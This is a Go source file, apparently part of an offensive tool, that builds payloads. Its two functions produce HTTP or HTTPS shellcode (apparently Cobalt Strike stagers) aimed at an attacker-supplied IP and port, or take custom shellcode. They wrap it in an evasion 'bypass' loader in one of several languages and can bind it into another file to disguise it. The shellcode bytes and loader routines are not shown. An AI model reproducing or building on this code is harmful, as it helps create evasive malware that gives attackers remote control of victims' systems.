package service

import (
	"strings"
)

func Bypass_start(bypass string, output string, ip string, port string, rec_type string, x64 string, choose_shellcode string, shellcode string, fileName string) {
	if choose_shellcode == "custom" {
		Shellcode := strings.Replace(strings.Replace(shellcode, " ", "", -1), "\n", "", -1)
		Bypass_way(bypass, Shellcode, fileName)
	} else {
		if rec_type == "http" {
			if x64 == "0" {
				Shellcode := CS_Http_Shellcode32(ip, port)
				switch output {
				case "C":
					Bypass_way(bypass, Shellcode.C, fileName)
				case "C#":
					Bypass_way(bypass, Shellcode.Cs, fileName)
				case "Java":
					Bypass_way(bypass, Shellcode.Java, fileName)
				case "Perl":
					Bypass_way(bypass, Shellcode.Perl, fileName)
				case "Python":
					Bypass_way(bypass, Shellcode.Python, fileName)
				case "Ruby":
					Bypass_way(bypass, Shellcode.Ruby, fileName)
				}
			}
			if x64 == "1" {
				Shellcode := CS_Http_Shellcode64(ip, port)
				switch output {
				case "C":
					Bypass_way(bypass, Shellcode.C, fileName)
				case "C#":
					Bypass_way(bypass, Shellcode.Cs, fileName)
				case "Java":
					Bypass_way(bypass, Shellcode.Java, fileName)
				case "Perl":
					Bypass_way(bypass, Shellcode.Perl, fileName)
				case "Python":
					Bypass_way(bypass, Shellcode.Python, fileName)
				case "Ruby":
					Bypass_way(bypass, Shellcode.Ruby, fileName)
				}
			}
		}
		if rec_type == "https" {
			if x64 == "0" {
				Shellcode := CS_Https_Shellcode32(ip, port)
				switch output {
				case "C":
					Bypass_way(bypass, Shellcode.C, fileName)
				case "C#":
					Bypass_way(bypass, Shellcode.Cs, fileName)
				case "Java":
					Bypass_way(bypass, Shellcode.Java, fileName)
				case "Perl":
					Bypass_way(bypass, Shellcode.Perl, fileName)
				case "Python":
					Bypass_way(bypass, Shellcode.Python, fileName)
				case "Ruby":
					Bypass_way(bypass, Shellcode.Ruby, fileName)
				}
			}
			if x64 == "1" {
				Shellcode := CS_Https_Shellcode64(ip, port)
				switch output {
				case "C":
					Bypass_way(bypass, Shellcode.C, fileName)
				case "C#":
					Bypass_way(bypass, Shellcode.Cs, fileName)
				case "Java":
					Bypass_way(bypass, Shellcode.Java, fileName)
				case "Perl":
					Bypass_way(bypass, Shellcode.Perl, fileName)
				case "Python":
					Bypass_way(bypass, Shellcode.Python, fileName)
				case "Ruby":
					Bypass_way(bypass, Shellcode.Ruby, fileName)
				}
			}
		}
	}

}

func BinderBypass_start(bypass string, output string, ip string, port string, rec_type string, x64 string, choose_shellcode string, shellcode string, fileName string, binderFilePath string, binderFileName string) {
	if choose_shellcode == "custom" {
		Shellcode := strings.Replace(strings.Replace(shellcode, " ", "", -1), "\n", "", -1)
		BinderBypass_way(bypass, Shellcode, fileName, binderFilePath, binderFileName)
	} else {
		if rec_type == "http" {
			if x64 == "0" {
				Shellcode := CS_Http_Shellcode32(ip, port)
				switch output {
				case "C":
					BinderBypass_way(bypass, Shellcode.C, fileName, binderFilePath, binderFileName)
				case "C#":
					BinderBypass_way(bypass, Shellcode.Cs, fileName, binderFilePath, binderFileName)
				case "Java":
					BinderBypass_way(bypass, Shellcode.Java, fileName, binderFilePath, binderFileName)
				case "Perl":
					BinderBypass_way(bypass, Shellcode.Perl, fileName, binderFilePath, binderFileName)
				case "Python":
					BinderBypass_way(bypass, Shellcode.Python, fileName, binderFilePath, binderFileName)
				case "Ruby":
					BinderBypass_way(bypass, Shellcode.Ruby, fileName, binderFilePath, binderFileName)
				}
			}
			if x64 == "1" {
				Shellcode := CS_Http_Shellcode64(ip, port)
				switch output {
				case "C":
					BinderBypass_way(bypass, Shellcode.C, fileName, binderFilePath, binderFileName)
				case "C#":
					BinderBypass_way(bypass, Shellcode.Cs, fileName, binderFilePath, binderFileName)
				case "Java":
					BinderBypass_way(bypass, Shellcode.Java, fileName, binderFilePath, binderFileName)
				case "Perl":
					BinderBypass_way(bypass, Shellcode.Perl, fileName, binderFilePath, binderFileName)
				case "Python":
					BinderBypass_way(bypass, Shellcode.Python, fileName, binderFilePath, binderFileName)
				case "Ruby":
					BinderBypass_way(bypass, Shellcode.Ruby, fileName, binderFilePath, binderFileName)
				}
			}
		}
		if rec_type == "https" {
			if x64 == "0" {
				Shellcode := CS_Https_Shellcode32(ip, port)
				switch output {
				case "C":
					BinderBypass_way(bypass, Shellcode.C, fileName, binderFilePath, binderFileName)
				case "C#":
					BinderBypass_way(bypass, Shellcode.Cs, fileName, binderFilePath, binderFileName)
				case "Java":
					BinderBypass_way(bypass, Shellcode.Java, fileName, binderFilePath, binderFileName)
				case "Perl":
					BinderBypass_way(bypass, Shellcode.Perl, fileName, binderFilePath, binderFileName)
				case "Python":
					BinderBypass_way(bypass, Shellcode.Python, fileName, binderFilePath, binderFileName)
				case "Ruby":
					BinderBypass_way(bypass, Shellcode.Ruby, fileName, binderFilePath, binderFileName)
				}
			}
			if x64 == "1" {
				Shellcode := CS_Https_Shellcode64(ip, port)
				switch output {
				case "C":
					BinderBypass_way(bypass, Shellcode.C, fileName, binderFilePath, binderFileName)
				case "C#":
					BinderBypass_way(bypass, Shellcode.Cs, fileName, binderFilePath, binderFileName)
				case "Java":
					BinderBypass_way(bypass, Shellcode.Java, fileName, binderFilePath, binderFileName)
				case "Perl":
					BinderBypass_way(bypass, Shellcode.Perl, fileName, binderFilePath, binderFileName)
				case "Python":
					BinderBypass_way(bypass, Shellcode.Python, fileName, binderFilePath, binderFileName)
				case "Ruby":
					BinderBypass_way(bypass, Shellcode.Ruby, fileName, binderFilePath, binderFileName)
				}
			}
		}
	}

}
